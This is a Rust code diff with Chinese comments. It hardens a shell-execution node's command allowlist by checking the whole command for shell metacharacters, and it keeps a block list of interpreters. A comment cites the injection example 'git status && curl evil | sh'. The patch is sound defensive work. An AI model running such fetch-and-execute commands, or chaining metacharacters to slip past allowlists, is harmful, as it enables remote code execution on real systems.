@@ -65,15 +65,20 @@ impl NodeExecutor for ShellNode {
         // 2. 白名单检查（如配置了 shell_allowed_commands，则仅允许匹配的命令）
         if !_ctx.shell_allowed_commands.is_empty() {
             let allowed = &_ctx.shell_allowed_commands;
-            let first_token = command.split_whitespace().next().unwrap_or(&command);
-            let command_name = first_token.trim_matches(|c| c == '"' || c == '\'');
-            // 防止 shell 元字符绕过白名单（; && || | ` $）
-            if command_name.contains([';', '&', '|', '`', '$']) {
+            // 元字符检查必须针对**整条命令**，不能只看第一个 token。
+            // 命令最终是交给 `cmd /C <command>` / `bash -c <command>` 执行的，
+            // 只检查 command_name 会让 `git status && curl evil | sh` 这类注入绕过白名单。
+            if let Some(meta) = command
+                .chars()
+                .find(|c| matches!(c, ';' | '&' | '|' | '`' | '$' | '\n' | '\r'))
+            {
                 return Err(anyhow::anyhow!(
-                    "Shell 命令名包含非法元字符: '{}'",
-                    command_name
+                    "安全限制: 白名单模式下命令不允许包含 shell 元字符 '{}'（会绕过白名单）",
+                    meta
                 ));
             }
+            let first_token = command.split_whitespace().next().unwrap_or(&command);
+            let command_name = first_token.trim_matches(|c| c == '"' || c == '\'');
             // 禁止白名单中包含解释器（防止 sh -c "任意命令" 绕过）
             const FORBIDDEN_INTERPRETERS: &[&str] = &["sh", "bash", "cmd", "cmd.exe", "powershell", "powershell.exe", "zsh", "fish", "python", "python3", "perl", "ruby", "node"];
             if FORBIDDEN_INTERPRETERS.contains(&command_name.to_lowercase().as_str()) {
